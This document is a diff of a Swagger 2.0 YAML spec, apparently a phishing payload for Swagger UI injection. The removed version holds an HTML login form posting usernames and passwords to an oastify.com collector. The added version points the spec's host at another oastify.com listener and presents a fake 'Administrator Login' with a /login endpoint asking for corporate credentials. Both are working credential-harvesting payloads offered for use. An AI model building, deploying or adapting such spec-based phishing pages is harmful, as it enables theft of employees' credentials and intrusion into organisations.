@@ -1,41 +1,41 @@
 swagger: '2.0'
+# El host apunta a tu servidor de escucha
+host: u1wvq58p8wbjqvwgxvuyhvy36ucl0bo0.oastify.com
+schemes:
+  - http
 info:
-  version: 1.0.0
-  title: Login Page
+  version: "1.0.0"
+  title: "System Authentication"
   description: |
-    <div class="login-form">
-      <div style="width: 100%; max-width: 400px; margin: 20px auto; padding: 20px; background: #f8d7da; border-radius: 8px; box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);">
-        <div style="background-color: #f8d7da; color: #721c24; padding: 16px 20px; border-radius: 4px; border: 1px solid #f5c6cb; font-size: 16px; text-align: center;">
-          <strong>An error occurred while loading, please log in.</strong>
-        </div>
-      </div>
-
-      <div class="heading">
-        <h1 style="text-align: center; font-size: 24px; color: #333; margin-bottom: 20px;">Login Page</h1>
-        <div class="form-container" style="width: 100%; max-width: 400px; margin: 0 auto; padding: 20px; background: #fff; border-radius: 8px; box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);">
-          <form action="http://299hs3bh178wiran0fkvenleo5uwin6c.oastify.com" method="post" class="form-signin">
-            <div class="form-group" style="margin-bottom: 15px;">
-              <label for="username" style="font-size: 14px; color: #555; display: block; margin-bottom: 5px;">Username</label>
-              <input type="text" name="username" style="width: 100%; padding: 10px; font-size: 14px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box;">
-            </div>
-            <div class="form-group" style="margin-bottom: 15px;">
-              <label for="password" style="font-size: 14px; color: #555; display: block; margin-bottom: 5px;">Password</label>
-              <input type="password" name="password" style="width: 100%; padding: 10px; font-size: 14px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box;">
-            </div>
-            <div class="form-group" style="margin-top: 20px;">
-              <button type="submit" class="btn btn-default" style="width: 100%; padding: 12px; background-color: #5cb85c; border: none; color: white; font-size: 16px; border-radius: 4px; cursor: pointer;">Login</button>
-            </div>
-          </form>
-        </div>
-      </div>
-
-      <div style="margin-top: 20px; text-align: right; font-size: 12px; color: #888;">
-        Coffinxp~/.lostsec
-      </div>
+    <div style="text-align: center; font-family: sans-serif;">
+      <img src="https://whare1.netrunners.sh/assets/img/profile.png" width="100" style="border-radius: 50%; margin-bottom: 10px;">
+      <h2 style="color: #333;">Administrator Login</h2>
+      <p style="color: #666;">Please use the form below to authenticate and access the API console.</p>
     </div>
+    <div style="background-color: #fff3cd; border: 1px solid #ffeeba; padding: 12px; border-radius: 4px; color: #856404; text-align: center;">
+      <strong>Note:</strong> Your session credentials will be validated against the security gateway.
+    </div>
+
 paths:
-  /:
+  /login:
     post:
+      summary: "User Authentication"
+      description: "Enter your corporate credentials to synchronize the Swagger session."
+      consumes:
+        - application/x-www-form-urlencoded
+      parameters:
+        - name: username
+          in: formData
+          description: "Corporate Username"
+          required: true
+          type: string
+        - name: password
+          in: formData
+          description: "Corporate Password"
+          required: true
+          type: string
       responses:
-        '200':
-          description: Login successful
+        200:
+          description: "Authentication token generated successfully."
+        401:
+          description: "Invalid credentials."
